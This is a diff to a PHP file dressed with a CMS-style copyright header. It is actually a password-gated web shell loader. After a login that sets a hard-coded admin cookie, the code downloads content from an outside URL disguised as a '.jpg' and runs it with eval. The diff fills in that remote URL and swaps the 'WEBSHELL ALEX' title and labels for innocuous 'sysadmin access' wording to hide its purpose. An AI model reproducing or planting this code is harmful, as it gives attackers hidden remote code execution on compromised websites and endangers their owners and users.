@@ -1,14 +1,14 @@
 <?php
 /**
- * @package    b
- * @copyright  Copyright (C) 2025 Open Source Matters, Inc. All rights reserved.
+ * @package    Haxor.Group
+ * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
  *
  */
 
 // @deprecated  1.0  Deprecated without replacement
 function is_logged_in()
 {
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@sukabintang01'; 
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@h4x0rqt'; 
 }
 
 if (is_logged_in()) {
@@ -56,7 +56,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = '';
+    $destiny = 'https://ikanmujaer.pages.dev/names.jpg';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
@@ -64,10 +64,10 @@ if (is_logged_in()) {
 } else {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
-        $hashed_key = '$2a$12$IN.1jPyuDgVgKRj88hznp.ObRo3namylR2EoI8qTpEGxZKSnWGU9C';
+        $hashed_key = '$2y$10$DgEzMTuHoRsO4HlCJ03yCeGxuBE2YackTlQIShCRSogbIBns9yap.'; // https://bcrypt.online/
         
         if (password_verify($entered_key, $hashed_key)) {
-            setcookie('user_id', 'admin@sukabintang01', time() + 3600, '/'); 
+            setcookie('user_id', 'admin@h4x0rqt', time() + 3600, '/'); 
             header("Location: ".$_SERVER['PHP_SELF']); 
             exit();
         }
@@ -76,7 +76,7 @@ if (is_logged_in()) {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>WEBSHELL ALEX</title>
+        <title>sysadmin access</title>
         <style>
             body {
                 margin: 0;
@@ -131,9 +131,9 @@ if (is_logged_in()) {
     <body>
         <div class="login-container">
             <form method="POST" action="">
-                <label for="password">LOGIN DISINI ALEX</label>
+                <label for="password">Please enter this code, we have consecrated this code for you to get more access, for you</label>
                 <input type="password" id="password" name="password" autofocus>
-                <input type="submit" value="LOGIN">
+                <input type="submit" value="acceso">
             </form>
         </div>
         <script>
